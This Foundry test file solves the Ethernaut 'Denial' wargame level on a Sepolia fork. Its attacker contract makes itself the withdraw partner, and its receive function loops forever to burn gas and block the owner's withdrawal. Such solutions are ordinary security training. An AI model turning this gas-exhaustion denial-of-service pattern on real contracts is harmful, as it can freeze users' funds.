// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/20-Denial/Denial.sol";

contract ContractTest is Test {
    Denial level20 =
        Denial(payable(0x68Ab247DEcCF27c99020dd1459612f8144542360));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x68Ab247DEcCF27c99020dd1459612f8144542360),
            "Ethernaut20"
        );
    }

    function testEthernaut20() public {
        AttackContract attacker = new AttackContract();
        attacker.trigger();
    }

    receive() external payable {}
}

contract AttackContract {
    address public tz1_lib;
    address public tz2_lib;
    address public owner;

    Denial level20 =
        Denial(payable(0x68Ab247DEcCF27c99020dd1459612f8144542360));

    function trigger() public {
        level20.setWithdrawPartner(address(this));
        level20.withdraw();
    }

    receive() external payable {
        while (true) {}
    }
}
